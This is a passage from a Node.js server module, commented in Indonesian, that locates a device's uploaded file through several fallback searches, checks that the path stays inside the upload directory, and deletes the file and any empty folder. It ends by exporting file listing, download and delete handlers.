    const relClean = relativePath.replace(/^[/\\]+/, '');
    const cand1 = path.resolve(targetDir, relClean);
    if (fs.existsSync(cand1) && fs.statSync(cand1).isFile()) filePath = cand1;
    if (!filePath) {
      const cand2 = path.resolve(baseDeviceDir, relClean);
      if (fs.existsSync(cand2) && fs.statSync(cand2).isFile()) filePath = cand2;
    }
  }

  // 2. targetDir / date / name (jika date ada)
  if (!filePath && date && date !== 'undefined' && date !== 'null' && date !== 'no-date') {
    const candidate = path.resolve(targetDir, date, name);
    if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) filePath = candidate;
  }

  // 3. targetDir / name
  if (!filePath) {
    const candidate = path.resolve(targetDir, name);
    if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) filePath = candidate;
  }

  // 4. cari di subfolder langsung di dalam targetDir (1 level)
  if (!filePath && fs.existsSync(targetDir)) {
    try {
      const subItems = fs.readdirSync(targetDir);
      for (const sub of subItems) {
        const candidate = path.resolve(targetDir, sub, name);
        if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
          filePath = candidate;
          break;
        }
      }
    } catch (_) { }
  }

  // 5. Fallback pencarian rekursif
  if (!filePath && fs.existsSync(targetDir)) {
    filePath = findFileDeep(targetDir, name);
  }
  if (!filePath && fs.existsSync(baseDeviceDir)) {
    filePath = findFileDeep(baseDeviceDir, name);
  }
  if (!filePath && fs.existsSync(uploadDir)) {
    try {
      const allDirs = fs.readdirSync(uploadDir);
      for (const d of allDirs) {
        if (d.startsWith(`${activeDeviceId}-`)) {
          const found = findFileDeep(path.join(uploadDir, d), name);
          if (found) {
            filePath = found;
            break;
          }
        }
      }
    } catch (_) { }
  }

  // Pencegahan directory traversal attack
  if (!filePath || !filePath.startsWith(path.resolve(uploadDir)) || !fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Berkas tidak ditemukan di VPS.' });
  }

  try {
    fs.unlinkSync(filePath);
    console.log(`🗑️ Berkas dihapus dari VPS disk: ${filePath}`);

    // Jika direktori tanggal kosong setelah berkas dihapus, hapus direktori tersebut
    const dirPath = path.dirname(filePath);
    if (fs.existsSync(dirPath) && fs.readdirSync(dirPath).length === 0) {
      fs.rmdirSync(dirPath);
      console.log(`🗑️ Folder kosong dihapus dari VPS: ${dirPath}`);
    }

    res.json({ status: 'success', message: 'Berkas berhasil dihapus dari VPS' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal menghapus berkas dari VPS.', details: err.message });
  }
}

module.exports = {
  getFiles,
  getFileMetadata,
  previewFileCached,
  downloadFileCached,
  getJsonList,
  getJsonContent,
  getVpsFiles,
  downloadVpsFile,
  deleteVpsFile
};
